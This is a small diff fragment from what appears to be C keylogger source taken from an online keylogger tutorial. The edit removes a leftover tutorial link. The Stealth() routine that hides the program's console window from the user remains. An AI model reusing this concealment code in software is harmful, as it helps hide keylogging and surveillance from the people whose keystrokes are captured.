@@ -73,4 +73,4 @@ void Stealth()
   AllocConsole();
   Stealth = FindWindowA("ConsoleWindowClass", NULL);
   ShowWindow(Stealth,0);
-} - See more at: http://www.hax0rtools.com/2013/09/basic-keylogger-in-c-tutorial.html#sthash.irmWOseZ.dpuf
+}
